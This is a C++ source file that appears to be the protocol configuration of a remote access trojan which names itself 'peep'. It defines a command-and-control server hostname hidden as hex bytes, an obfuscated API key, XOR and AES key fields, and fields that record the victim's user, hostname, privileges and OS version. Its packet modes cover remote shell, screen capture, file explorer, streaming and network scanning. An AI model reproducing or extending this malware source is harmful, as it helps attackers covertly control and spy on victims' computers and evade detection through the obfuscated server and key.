#include "protocol.h"
#include "analyze.h"
#include <iostream>

// vars
const char*             OK = "OK";
const int	            PACKET_ERROR_I = 0xFF01;
const list<pair<size_t, char*>>    PACKET_ERROR;
const pair<json, char*> BLOCK_ERROR = make_pair("{}", (char*)"0xFF01");
string KEY_XOR          = "";
const string SERVER     = { 0x61, 0x6c, 0x62, 0x65, 0x72, 0x74, 0x2e, 0x70, 0x79, 0x74, 0x68, 0x6f, 0x6e, 0x61, 0x6e, 0x79, 0x77, 0x68, 0x65, 0x72, 0x65, 0x2e, 0x63, 0x6f, 0x6d };
const string API_KEY    =  { 0x34, 0x42, 0x32, 0x46, 0x2d, 0x30, 0x35, 0x44, 0x42, 0x2d, 0x44, 0x43, 0x42, 0x41, 0x2d, 0x34, 0x45, 0x45, 0x44 };//"4B2F-05DB-DCBA-4EED";
const char*       S_KEY = "<$lil$>";
const size_t MAX_LEN_PROTO = 100000000;// 10MB
const size_t MAX_LEN_EDITOR = 1000000; // 100KB
const size_t MIN_CHANGE_FRM = 20;
char PEEP_NAME[256];
const vector<string> TYPE_FILE_BINARY = { { "exe" }, { "zip" }, {"jpg"}, {"png"}, {"dll"}, {"gif"}, {"db"}, {"apk"}, {"move"}, {"ico"}, {"vdi"} , {"wim"} };
char EMPTY[] = "EMPTY";
map<string, int> SETTING = {
    {"t:connect",       0},
    {"rs:connect",      0},
    {"scrn:connect",    0},
    {"expl:connect",    0},
    {"scn:connect",     0},
    {"trs:connect",     0}
};
json PACKET_T_PROTOCOL = {
    {"trojan",  "peep"},
    {"ip",      ""},
    {"recv",    1024},
    {"port",    0},
    {"user",    ""},
    {"hostname", ""},
    {"key_sock", ""},
    {"priv",    ""},
    {"versionos", ""},
    {"key_aes", ""},
    {"key_aes_iv", ""},
    {"xor", ""},
    {"block_stream", false},
    {"screen",  1},
    {"shell",   1},
    {"explorer", 1},
    {"ping",    1},
    {"streamer", 0},
    {"scanner", 0},
    {"shell-ter", 1}
};

map<int, string> MODE_PACKAGE = {
    {1, "CONNECT"},/*unused*/
    {2, "PING"},
    {3, "SHELL"},
    {4, "SCREEN"},
    {5, "EXPLORER"},
    {6, "STREAMER"},
    {7, "SHELL-TER"},
    {8, "SCANNER"},
    {9, "SIGNAL"},
};


json SCREEN_S = {
    {"quality", 3},
    {"frm", 200},
};

const int SUM_BLOCKS = 3;
char BLOCK_FRM[] = "<BLOCK>";

// function
string new_key_xor() {
    KEY_XOR = random_ascii(20);
    return KEY_XOR;
}




